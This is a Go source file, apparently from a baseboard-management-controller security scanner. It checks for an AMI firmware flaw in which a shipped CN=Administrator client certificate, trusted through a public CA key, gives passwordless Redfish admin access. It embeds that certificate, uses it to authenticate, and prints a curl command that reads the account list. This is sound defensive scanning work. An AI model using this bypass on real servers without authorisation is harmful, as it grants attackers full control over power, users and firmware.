package check

import (
	"context"
	_ "embed"
	"fmt"
	"net"
	"net/http"
	"strconv"
	"strings"
	"time"

	"github.com/runZeroInc/excrypto/crypto/tls"
	"github.com/runZeroInc/oobscan/pkg/engine"
	"github.com/runZeroInc/oobscan/pkg/redfish"
	"github.com/runZeroInc/oobscan/pkg/tlscert"
)

func init() {
	Register(Check{
		Name:        "tls.mtls.ami.caBypass",
		Description: "AMI shipped-CA mutual-TLS bypass: CN=Administrator client cert authenticates passwordless admin over Redfish",
		Category:    "tls",
		Applies:     Applicability{CrossVendor: true},
		Enabled:     true,
		Run:         runAMIMTLSBypass,
	})
}

func runAMIMTLSBypass(ctx context.Context, t *engine.Target) []engine.Finding {
	if t == nil {
		return nil
	}
	to := max(t.Timeout, 4*time.Second)

	if t.DisableLogins {
		return nil
	}

	var (
		port int
		ci   *tlscert.CertInfo
	)
	for _, cand := range mtlsCandidatePorts(t) {
		got, err := tlscert.Inspect(t.Host, cand, to)
		if err != nil || got == nil || !got.ClientCertRequested {
			continue
		}
		port, ci = cand, got
		break
	}
	if ci == nil {

		return nil
	}
	isAMI := (ci.SharedKeyMatch != nil && ci.SharedKeyMatch.Vendor == "ami") ||
		(ci.DefaultSubject != nil && ci.DefaultSubject.Vendor == "ami") ||
		ci.Vendor == "ami"
	if !isAMI {

		return nil
	}

	res := verifyAMIMTLSBypass(t.Host, port, to)
	if !res.Confirmed {

		if t.DebugLog != nil {
			t.DebugLog(fmt.Sprintf("tls.mtls.ami.caBypass: measured port=%d clientCertRequested=true confirmed=false acceptableCAs=%v",
				port, ci.AcceptableCAs))
		}
		return nil
	}

	vendor := res.Info.Vendor
	if vendor == "" {
		vendor = "ami"
	}
	t.SetEvidence("redfish.postAuth", &redfish.PostAuthSnapshot{
		Method: "mtls",
		Via:    "mtls",
		User:   "Administrator",
		Source: "firmware-shipped-client-cert",
		Info:   res.Info,
	})
	return []engine.Finding{{
		Check: "tls.mtls.ami.caBypass", Category: "tls", Risk: "critical",
		Port: port, Transport: "tcp", Protocol: "https",
		Fields: engine.F(
			"mtls", "enabled",
			"username", "Administrator",
			"evidenceEndpoint", "/redfish/v1/AccountService/Accounts",
			"sessionAuthenticated", "true",
			"vendor", vendor,
			"model", res.Info.Model,
			"firmwareVersion", res.Info.FirmwareVersion,
			"redfishVersion", res.Info.RedfishVersion,
			"serviceUuid", res.Info.ServiceUUID,
			"product", res.Info.Product,
			"serial", res.Info.SerialNumber,
			"managerId", res.Info.ManagerID,
			"systemId", res.Info.SystemID,
			"biosVersion", res.Info.BIOSVersion,
			"powerState", res.Info.PowerState,
			"accountRole", res.Info.AccountRole,
			"accountEnabled", res.Info.AccountEnabled,
			"proof", res.Evidence,
		),
	}}
}

//go:embed ami_admin_client.pem
var amiAdminClientPEM []byte

func amiClientCert() (tls.Certificate, bool) {
	c, err := tls.X509KeyPair(amiAdminClientPEM, amiAdminClientPEM)
	if err != nil {
		return tls.Certificate{}, false
	}
	return c, true
}

func amiMTLSClient(cert tls.Certificate, timeout time.Duration) *http.Client {
	if timeout <= 0 {
		timeout = 4 * time.Second
	}
	phase := min(timeout, 5*time.Second)
	dialer := &net.Dialer{Timeout: phase, KeepAlive: -1}
	cfg := &tls.Config{
		InsecureSkipVerify: true,
		MinVersion:         tls.VersionTLS10,
		GetClientCertificate: func(*tls.CertificateRequestInfo) (*tls.Certificate, error) {
			return &cert, nil
		},
	}
	tlsDialer := &tls.Dialer{NetDialer: dialer, Config: cfg}
	return &http.Client{
		Timeout: timeout,
		Transport: &http.Transport{
			DisableKeepAlives:     true,
			DialContext:           dialer.DialContext,
			DialTLSContext:        tlsDialer.DialContext,
			ForceAttemptHTTP2:     false,
			TLSHandshakeTimeout:   phase,
			ResponseHeaderTimeout: phase,
			MaxConnsPerHost:       2,
		},

		CheckRedirect: func(*http.Request, []*http.Request) error { return http.ErrUseLastResponse },
	}
}

type amiMTLSResult struct {
	Confirmed bool
	Info      redfish.SystemInfo
	Evidence  string
}

func verifyAMIMTLSBypass(host string, port int, timeout time.Duration) amiMTLSResult {
	cert, ok := amiClientCert()
	if !ok {
		return amiMTLSResult{}
	}
	base := redfish.BaseURL(host, port)

	noCert := redfish.InsecureClient(timeout)
	if authed, _ := redfish.AuthedResource(noCert, base, nil, timeout); authed {
		return amiMTLSResult{}
	}

	withCert := amiMTLSClient(cert, timeout)
	authed, body := redfish.AuthedResource(withCert, base, nil, timeout)
	if !authed {
		return amiMTLSResult{}
	}

	info := redfish.PullSystemInfo(withCert, base, nil, "Administrator", timeout)
	return amiMTLSResult{Confirmed: true, Info: info, Evidence: proofKV("auth", "mtls", "resource", "admin", "bodyBytes", strconv.Itoa(len(body)))}
}

func init() {
	RegisterExplain("tls.mtls.ami.caBypass", explainAMIMTLSBypass)
}

func explainAMIMTLSBypass(host string, f engine.Finding) string {
	model := explainField(f, "model")
	fw := explainField(f, "firmwareVersion")
	evidence := explainField(f, "proof")
	var b strings.Builder
	b.WriteString(explainHeading(host, f))
	b.WriteString("\nThe BMC trusts the AMI firmware CA (`CN=www.ami.com`) whose private key is\n")
	b.WriteString("byte-identical across all AMI OEM boards and is public (extracted from firmware).\n")
	b.WriteString("Presenting the shipped `CN=Administrator` client cert authenticates as admin.\n")
	if model != "" || fw != "" {
		b.WriteString(fmt.Sprintf("\n**Device:** %s firmware %s\n", model, fw))
	}
	if evidence != "" {
		b.WriteString(fmt.Sprintf("**Proof:** `%s`\n", evidence))
	}
	b.WriteString("\n**Validate with the shipped cert:**\n")
	b.WriteString(explainSh(
		"# Cert: usr/local/redfish/certs/user.pem from AMI firmware (CN=Administrator, CA=CN=www.ami.com)",
		`curl -sk --cert ami_admin_client.pem --key ami_admin_client.pem \`,
		fmt.Sprintf(`  https://%s/redfish/v1/AccountService/Accounts | python3 -m json.tool`, host),
	))
	b.WriteString("\n\n**Impact:** Passwordless admin Redfish access -- power control, user management,\n")
	b.WriteString("firmware update, virtual media, and SOL.\n")
	return b.String()
}

func mtlsCandidatePorts(t *engine.Target) []int {
	out := make([]int, 0, 2)
	if p := webPort(t); p > 0 {
		out = append(out, p)
	}
	if len(out) == 0 || out[0] != 443 {
		out = append(out, 443)
	}
	return out
}
